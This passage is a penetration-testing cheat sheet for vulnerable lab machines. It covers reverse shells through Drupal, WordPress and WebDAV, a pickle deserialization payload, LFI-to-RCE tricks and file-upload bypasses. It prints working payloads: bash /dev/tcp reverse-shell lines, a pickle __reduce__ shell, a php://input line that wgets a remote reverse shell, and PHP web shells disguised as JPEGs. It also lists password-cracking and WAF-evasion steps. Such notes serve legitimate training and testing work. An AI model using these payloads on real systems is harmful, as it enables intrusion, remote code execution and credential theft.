   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station

* Transfer an image
	
 :: 

   base64 flair.jpg 
   Copy output 
   vi flair 
   Paste the clipboard 
   base64 -d flair > flair.jpg

* Have a web-accessible git ? utilize `dvcs-ripper <https://github.com/kost/dvcs-ripper>`_ to rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr. It can rip repositories even when directory browsing is turned off. Eric Gruber has written a blog on `Dumping Git Data from Misconfigured Web Servers <https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/>`_ providing good walkthru.

* It's always important to find, what's installed on the box:

 :: 

   dpkg-query -l 

 or using wild cards

 :: 

   dpkg-query -l 'perl*'

* It's always important to note down all the passwords found during the process of exploiting a vulnerable machine as there is a great possibility that passwords would be reused.
 
* If you have .jar file, Probably use jd-gui to decompile and view the class file. 


* Find recently modified files:

  ::

   find / -mmin -10 -type f 2>/dev/null

  The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.

* Getting a reverse shell from:

 * Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text for. 
   
   Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from `Droopy Vulnhub WriteUp <https://g0blin.co.uk/droopy-vulnhub-writeup/>`_
   Drupal settings file location: /var/www/html/sites/default/settings.php
 
 * WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.

* If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf
 
 * If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy. 
 * We may utilize `Proxychains <https://github.com/haad/proxychains>`_ to access the other side of network like ssh, http etc. 

* Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running "http:\\IP\panel" should provide us valid extensions.

* Sharepoint running? Probably, check `SPartan <https://github.com/sensepost/SPartan>`_ Frontpage and Sharepoint fingerprinting and attack tool and `SharePwn <https://github.com/0rigen/SharePwn>`_ SharePoint Security Auditor.

* authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.

* Mostly, if there's only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?

* If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)

* Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.

  ::

   swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body "Hey Buddy How are you doing" --header "Subject: Hello! Long time"

* Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.

 ::

  unshadow passwd shadown

* If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav or cadaver (A command-line WebDAV client for Unix) to see which files are allowed

 ::

  davtest -url http://10.54.98.15/
  ********************************************************
   Testing DAV connection
  OPEN		SUCCEED:		http://10.54.98.15
  ********************************************************
  NOTE	Random string for this session: E3u9ISnNswYes0
  ********************************************************
   Creating directory
  MKCOL		SUCCEED:		Created http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
  ********************************************************
   Sending test files
  PUT	pl	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
  PUT	asp	FAIL
  PUT	aspx	FAIL
  PUT	cgi	FAIL
  PUT	html	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
  PUT	cfm	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
  PUT	jhtml	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
  PUT	shtml	FAIL
  PUT	php	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
  PUT	jsp	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
  PUT	txt	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
  ********************************************************
   Checking for test file execution
  EXEC	pl	FAIL
  EXEC	html	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
  EXEC	cfm	FAIL
  EXEC	jhtml	FAIL
  EXEC	php	FAIL
  EXEC	jsp	FAIL
  EXEC	txt	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
  
  ********************************************************
  /usr/bin/davtest Summary:
  Created: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
  Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
  Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
 
 Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a php meterpreter in a text file and then MOVE the .txt file to .php and execute the php file.

* In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let's say the ramdump was saved at

  ::

   /tmp/ramdump

  If, you create a symlink from /tmp/ramdump to /etc/crontab

  ::

   ln -s /etc/crontab /tmp/ramdump

  Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as 

  ::

   cat cron.py
   print "* * * * * root /bin/bash /home/username/evilscript"
  
  the injected string will end up in /etc/crontab will be executed.

  The contents of evilscript can be

  ::

   /bin/bash -i >& /dev/tcp/IP/Port 0>&1

  which will provide the root shell to the attacker. Thanks to TheColonial :)

* `phpbash <https://github.com/Arrexel/phpbash>`_ is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible.

* ps aux not fully visible try 

  ::

   echo "`ps aux --sort -rss`"

* If there's a XXE on a website and possible RFI using internal address i.e on http://127.0.0.1:80/home=RFI rather than http://10.54.98.10:80/home=RFI, utilize XXE to send the request with localaddress.

* If there's a possible command execution on a website such as 

  ::

   curl -A "bitvijays" -i "http://IPAddress/example?parameter=' whoami'"

  However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_ and `Web Application Firewall (WAF) Evasion Techniques #2 <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>`_ ! Amazing stuff here!
  Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.

* Similar to ls there is dir in linux. Try "dir -l" Might be helpful sometimes.

* Sometimes, we don't have tools on the victim machine, in that case we can download static binaries from `Static-Binaries <https://github.com/andrew-d/static-binaries>`_ If not, found, try the deb or rpm package of the binary, extract it and upload.

* If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 

  ::

   conn,addr = self.receiver_socket.accept()
   data = conn.recv(1024)
   return cPickle.loads(data)

 we may use

 ::

  class Shell_code(object):
  def __reduce__(self):
          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
  shell = cPickle.dumps(Shell_code())
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client_socket.connect(('Server IP','Server PORT'))
  client_socket.send(shell)

 Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_

* Handy Stuff

 * Utilize xxd to convert hex to ascii

  ::

   xxd -r -p
   -p | -ps | -postscript | -plain : output in postscript continuous hexdump style. Also known as plain hexdump style.
   -r | -revert : reverse operation: convert (or patch) hexdump into binary.  If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere.

 * Use python

  * binascii.unhexlify(hexstr) to convert hex to string
  * base64.decodestring(str) to decode base64 string
  * Convert number to hex

   :: 
     
      hex(15)
      '0xf'

  * Convert hex to decimal

   ::

    s = "6a48f82d8e828ce82b82"
    i = int(s, 16)

 * Getting out of more
  
  If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.

  ::
   
    cat /etc/passwd | grep user1
    user1:x:11026:11026:user level 1:/home/user1:/usr/bin/showtext

  Here Instead of /bin/bash, user1 is using /usr/bin/showtext, which is apparently not a shell. Let’s look at the content of the file

  ::

    cat /usr/bin/showtext
    #!/bin/sh
    more ~/text.txt
    exit 0

  In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.

 * List all the files together

  ::

   find /home -type f -printf "%f\t%p\t%u\%g\t%m\n" 2>/dev/null | column -t
 

Cyber-Deception
===============

Wordpot
-------

`Wordpot <https://github.com/gbrindisi/wordpot>`_ : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.

::

 python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress

FakeSMTP
--------

`FakeSMTP <http://nilhcem.com/FakeSMTP/>`_ : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.

::

  java -jar /opt/fakesmtp/target/fakeSMTP-2.1-SNAPSHOT.jar -s -b -p 2525 127.0.0.1 -o /home/username

Rubberglue
----------

`Rubberglue <https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md>`_ : We can use Rubberglue to listen on a port such that any traffic it receives on that port it will forward back to the client ( attacker ) on the same port.

::

  python2 /opt/honeyports/honeyports-0.4.py -p 23

Knockd
------

`Knockd - Port-knocking server <http://www.zeroflux.org/projects/knock>`_ : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.

If there is port knocking involved, read the /etc/knockd.conf, read the sequence port know should be done and execute

::

 for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done

DCEPT
-----

SecureWorks researchers have created a solution known as `DCEPT (Domain Controller Enticing Password Tripwire) <https://www.secureworks.com/blog/dcept>`_ to detect network intrusions. Github is `dcept <https://github.com/secureworks/dcept>`_ 

Useful Tools
============

* `exe2hex <https://github.com/g0tmi1k/exe2hex>`_ : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell). 

* `Powercat <https://github.com/secabstraction/PowerCat>`_ : A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat

.. _A1-Local-file-Inclusion:

Appendix-I : Local File Inclusion
=================================

Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.

Tools
-----

To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applications/uniscan>`_ Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. 

::

  uniscan -h
  OPTIONS:
    -h  help
    -u  <url> example: https://www.example.com/
    -f  <file> list of url's
    -b  Uniscan go to background
    -q  Enable Directory checks
    -w  Enable File checks
    -e  Enable robots.txt and sitemap.xml check
    -d  Enable Dynamic checks
    -s  Enable Static checks
    -r  Enable Stress checks
    -i  <dork> Bing search
    -o  <dork> Google search
    -g  Web fingerprint
    -j  Server fingerprint

  usage:
  [1] perl ./uniscan.pl -u http://www.example.com/ -qweds
  [2] perl ./uniscan.pl -f sites.txt -bqweds
  [3] perl ./uniscan.pl -i uniscan
  [4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
  [5] perl ./uniscan.pl -o "inurl:test"
  [6] perl ./uniscan.pl -u https://www.example.com/ -r

There's another tool called `fimap <https://tools.kali.org/web-applications/fimap>`_. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.

.. Note :: Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.

Filtering in LFI
^^^^^^^^^^^^^^^^

Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly. 

For example: the below code only includes the file which are named secret
::

 <?php
   $file = @$_GET['filname'];
   if(strlen($file) > 55)
      exit("File name too long.");
   $fileName = basename($file);
   if(!strpos($file, "secret"))
     exit("No secret is selected.");
   echo "<pre>";
   include($file);
   echo "</pre>";
 ?>

LFI to Remote Code Execution
----------------------------

Mainly taken from `LFI-Cheat-Sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_ , `Exploiting PHP File Inclusion – Overview <https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/>`_ and `Upgrade from LFI to RCE via PHP Sessions <https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/>`_

There are variety of different tricks to turn your LFI into RCE. Using 

File upload forms/ functions
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.

PHP wrapper expect://command
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.

An example of PHP expect:

::

 http://IP/fileincl/example1.php?page=expect://ls

If PHP expect wrapper is disabled, below error is encountered.

::

 Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 
 Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 
 Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 
 Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7

PHP Wrapper zip
^^^^^^^^^^^^^^^

Let's say there is a upload functionality on the victim machine, however the file saved doesn't have executeable permission, in that case if we upload a zip file containing a shellcode such as

Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the "system" is blocked use, scandir() for directory listing etc. )

::

 echo "<?php system("ls"); ?>" > shell.php

and 

::

 zip shell.zip shell.php

Now, if we upload this zip file somehow to the victim machine and know it's location (Let's say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution

`Zip Usage <http://php.net/manual/en/wrappers.compression.php>`_ 

::

 zip://archive.zip#dir/file.txt

Burp Request

::

 GET /?op=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
 Host: 10.50.66.93
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

 %23 is the #

and we get RCE

::

 home.php
 index.php
 upload.php
 uploads
 view.php

We may read more about it at `Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up <https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/>`_ or `CodeGate General CTF 2015: Owlur <https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur>`_ -- Read other write-ups in this. 

PHP Wrapper phar
^^^^^^^^^^^^^^^^

RCE can also be done using `Using Phar Archives: the phar stream wrapper <http://php.net/manual/en/phar.using.stream.php>`_ 

PHP wrapper php://file
^^^^^^^^^^^^^^^^^^^^^^
PHP wrapper php://filter
^^^^^^^^^^^^^^^^^^^^^^^^

php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.

The output is encoded using base64, so you’ll need to decode the output.

::

 http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

or

We could use php filter to read the source code of a PHP File

:: 

  http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php

More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_

PHP input:// stream
^^^^^^^^^^^^^^^^^^^

php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.

Send your payload in the POST request using curl, burp.

Example:

::

 http://IP/fileincl/example1.php?page=php://input


Post Data payload:

::

  <? system('wget http://IP/php-reverse-shell.php -O /var/www/shell.php');?>

After uploading execute the reverse shell at 

::

 http://IP/shell.php

data://text/plain;base64,command
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

/proc/self/environ
^^^^^^^^^^^^^^^^^^

If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.

/proc/self/fd
^^^^^^^^^^^^^

If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.

This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc. 
Utilize `LFI-LogFileCheck.txt <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt>`_ with Burp Intruder, and check for the returned page sizes.

Control over PHP Session Values
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Let's say, a vulnerable page is present with the post request

::

 POST /upload/? HTTP/1.1
 Host: vulnerable.redacted.com
 User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Content-Type: application/x-www-form-urlencoded
 Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
 Content-Length: 44
 Connection: close
 Upgrade-Insecure-Requests: 1
 
 login=1&user=admin&pass=admin&lang=en_us.php

with LFI

::

 login=1&user=admin&pass=admin&lang=../../../../../../../../../../etc/passwd

Now, the server store cookies

::

 Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly

As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27

Now, we can write the cookie with a php command

::

 POST /upload/? HTTP/1.1
 Host: vulnerable.redacted.com
 User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Content-Type: application/x-www-form-urlencoded
 Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
 Content-Length: 134
 Connection: close
 Upgrade-Insecure-Requests: 1

 login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php

This would result in 

::

 Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly

Now, the php command can be executed using

::

 POST /upload/? HTTP/1.1
 Host: vulnerable.redacted.com
 User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 141
 Connection: close
 Upgrade-Insecure-Requests: 1

 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27

The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)

Email Server 
^^^^^^^^^^^^

.. _A2-File-Upload:

Appendix-II : File Upload
=========================

Examples
--------

Simple File Upload
^^^^^^^^^^^^^^^^^^

Intercepting the request in Burp/ ZAP and changing the file-extension.

Below is the PHP code

::

  <?  

  function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
  } 

  function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
  } 

  function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
  } 

  if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
  } else { 
  ?> 
  <form enctype="multipart/form-data" action="index.php" method="POST">  
  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />  
  Choose a JPEG to upload (max 1KB):<br/>  
  <input name="uploadedfile" type="file" /><br />  
  <input type="submit" value="Upload File" />  
  </form>  
  <? } ?>   

If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.

* Create a fake JPG containing php code.

  We’ll be using system() to read our password.

 ::

   echo "<?php system($_GET["cmd"]); ?>" > shell.jpg  

* Upload JPG, intercept in Burp/ ZAP and change the extension

 ::

   <input name="filename" value="o0xn5q93si.jpg" type="hidden">  

  is changed to

 ::

  <input name="filename" value="o0xn5q93si.php" type="hidden">  

Simple File Upload - With verifying image type
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded

::

  <?php  
  ...  
  
  else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
        echo "File is not an image";  
    }  
  
  ...  
  
  ?> 

Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a "Magic Number" at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.

* Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let's say first 100 bytes)

 ::

   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg

   -n length         : Interpret only length bytes of Input
   -e format_string  : Specify a format string to be used for displaying data

 Example:
 
 ::

   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
   \xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
  
* Create a file with JPG header and command shell code using python

  ::

   >>> fh = open('shell.php','w')  
   >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
   >>> fh.close()   

.. Tip :: Do check the source code of the page for any client-side file validation or any commented hidden parameters?

We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.

Modifying File Upload Page
^^^^^^^^^^^^^^^^^^^^^^^^^^

Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there's a LFI and we have seen the code of upload function. The first thing to check would be "What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc."

Let's say, there is a upload form which has a text-field for accepting input (Let's say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let's see the current form in inspect-element.

Client-Side Code

::

 <form enctype="multipart/form-data" action="?op=upload" method="POST">
    <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br>
	<input type="text" id="name" name="name" value="" style="width:355px;">
    <input type="submit" name="submit" value="Send Tip!">
 </form>

If we see the above form, accepts two inputs

* text type field named sinfo for providing detailed information about the server and
* text type field named name for providing name of the server.

Let's also see, serverside code

::

 if(isset($_POST['submit']) && isset($_POST['sinfo'])) {
	    	$tip = $_POST['sinfo'];
    		$secretname = genFilename();  ## Generates a random file name
	    	file_put_contents("uploads/". $client_ip . '/' . $secretname,  $sinfo);

If we see, the contents of sinfo are directly put in a file.


In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.

::

 <form enctype="multipart/form-data" action="?op=upload" method="POST">
 #  <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br> ---------- We have commented this and add the below line.
	<input type="file" id="sinfo" name="sinfo" value="" style="width:355px;">
	<input type="text" id="name" name="name" value="" style="width:355px;">
    <input type="submit" name="submit" value="Send Tip!">
 </form>

Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.

.. Tip :: Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!


.. disqus::
